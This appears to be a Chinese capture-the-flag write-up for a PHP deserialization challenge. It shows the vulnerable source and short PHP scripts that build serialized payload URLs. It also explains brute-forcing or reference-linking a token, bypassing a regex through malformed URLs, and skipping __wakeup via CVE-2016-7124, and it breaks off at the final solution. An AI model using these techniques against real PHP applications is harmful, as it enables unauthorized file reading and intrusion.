</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>); 
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;file&#34;</span>]; 
</span></span><span style=display:flex><span>$payload <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;payload&#34;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($file)){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Missing parameter&#39;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/&#34;</span>,$file)){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;hack attacked!!!&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#66d9ef>include</span>($file);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($payload)){  
</span></span><span style=display:flex><span>    $url <span style=color:#f92672>=</span> <span style=color:#a6e22e>parse_url</span>($_SERVER[<span style=color:#e6db74>&#39;REQUEST_URI&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>parse_str</span>($url[<span style=color:#e6db74>&#39;query&#39;</span>],$query);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span>($query <span style=color:#66d9ef>as</span> $value){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/&#34;</span>,$value)) { 
</span></span><span style=display:flex><span>    	    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;stop hacking!&#39;</span>);
</span></span><span style=display:flex><span>    	    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $payload <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($payload);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{ 
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Missing parameters&#34;</span>; 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;!--Please test index.php?file=xxx.php --&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;!--Please get the source of hint.php--&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>hint.php:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-38>38</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Handle</span>{ 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $handle;  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup(){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>foreach</span>(<span style=color:#a6e22e>get_object_vars</span>($this) <span style=color:#66d9ef>as</span> $k <span style=color:#f92672>=&gt;</span> $v) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span>$k <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Waking up</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($handle) { 
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>handle</span> <span style=color:#f92672>=</span> $handle; 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct(){
</span></span><span style=display:flex><span>		$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>handle</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getFlag</span>();
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Flag</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $file;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $token;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $token_flag;
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __construct($file){
</span></span><span style=display:flex><span>		$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> $file;
</span></span><span style=display:flex><span>		$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token_flag</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>rand</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>10000</span>));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getFlag</span>(){
</span></span><span style=display:flex><span>		$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token_flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>rand</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>10000</span>));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token</span> <span style=color:#f92672>===</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token_flag</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>)){
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>echo</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>,<span style=color:#66d9ef>true</span>); 
</span></span><span style=display:flex><span>            }  
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>整体思路是利用Handle实例反序列化时调用的析构函数触发getFlag()，但有几个阻碍。</p><ul><li><p><code>$this->token === $this->token_flag</code> 需要这两个属性值相等才能读到文件，而token值不变，token_flag的值总是在变化。</p></li><li><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$url <span style=color:#f92672>=</span> <span style=color:#a6e22e>parse_url</span>($_SERVER[<span style=color:#e6db74>&#39;REQUEST_URI&#39;</span>]);
</span></span><span style=display:flex><span><span style=color:#a6e22e>parse_str</span>($url[<span style=color:#e6db74>&#39;query&#39;</span>],$query);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span>($query <span style=color:#66d9ef>as</span> $value){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/&#34;</span>,$value)) { 
</span></span><span style=display:flex><span>    	    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;stop hacking!&#39;</span>);
</span></span><span style=display:flex><span>    	    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p>url中不能包含flag字样，而反序列化后的字符串必然会包含 <code>flag</code> 。</p></li><li><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup(){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>foreach</span>(<span style=color:#a6e22e>get_object_vars</span>($this) <span style=color:#66d9ef>as</span> $k <span style=color:#f92672>=&gt;</span> $v) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span>$k <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Waking up</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p>字符串反序列化时会自动调用对象中的 <code>__wakeup</code> 方法，这里 <code>__wakeup</code> 方法将所有属性值置空，下面 <code>__destruct</code> 的时候就找不到 <code>$handle</code> 了。</p></li></ul><h2 id=整体方法>整体方法<a hidden class=anchor aria-hidden=true href=#整体方法>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$f<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Flag</span>(<span style=color:#e6db74>&#39;flag.php&#39;</span>);
</span></span><span style=display:flex><span>$target<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;[url]/index.php?file=hint.php&amp;payload=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>handle</span>($f)));
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $target;
</span></span></code></pre></td></tr></table></div></div><p>访问输出的链接。</p><h2 id=问题一>问题一<a hidden class=anchor aria-hidden=true href=#问题一>#</a></h2><p><code>__construct</code> 是在对象创建时自动调用，在反序列化时并不会被调用，这给了我们操纵token值的机会。</p><p>由于<code>rand(1,10000)</code> 返回值可能性并不多，可以采用爆破。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$f<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Flag</span>(<span style=color:#e6db74>&#39;flag.php&#39;</span>);
</span></span><span style=display:flex><span>$f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>token</span><span style=color:#f92672>=</span><span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#34;6666&#34;</span>);
</span></span><span style=display:flex><span>$target<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;[url]/index.php?file=hint.php&amp;payload=&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>handle</span>($f)));
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $target;
</span></span></code></pre></td></tr></table></div></div><p>重复访问输出的链接。</p><p>当然并不是说跑够一万次就一定能碰上，如果手气不好也可能总遇不到。</p><p><img loading=lazy src=a9712781ec4313008.png alt></p><p>那么可以采用每一次将token赋为不同的值，遍历全部一万种可能，直观上感觉这样做还碰不到的可能性会小很多。</p><p>上面是大力出奇迹的做法，还有比较优雅的做法：将token指向token_flag的引用或相反，那么当一者改变时另一个会跟随。</p><p><img loading=lazy src=5058a656c4e156f6c.png alt></p><h2 id=问题二>问题二<a hidden class=anchor aria-hidden=true href=#问题二>#</a></h2><p>正则看起来绕不过去，直接访问 <code>Flag.php</code> 返回404，说明服务端是大小写敏感的。突破点在于 <code>parse_url</code> 遇到畸形url时会解析失败，那么后面的正则自然不起作用了。</p><p><img loading=lazy src=bf6e25c0918561869.png alt></p><h2 id=问题三>问题三<a hidden class=anchor aria-hidden=true href=#问题三>#</a></h2><p>PHP有过一个漏洞 <code>CVE-2016-7124</code> ，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 <code>__wakeup</code> 的执行。</p><p>参考文章：</p><ul><li><a href="https://bugs.php.net/bug.php?id=72663">Sec Bug #72663 Create an Unexpected Object and Don&rsquo;t Invoke __wakeup() in Deserialization</a></li><li><a href=http://blog.knownsec.com/2016/09/sugarcrm-v6-5-23-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>SugarCRM v6.5.23 PHP反序列化对象注入漏洞</a></li></ul><h2 id=解法>解法<a hidden class=anchor aria-hidden=true href=#解法>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4> 4</a>
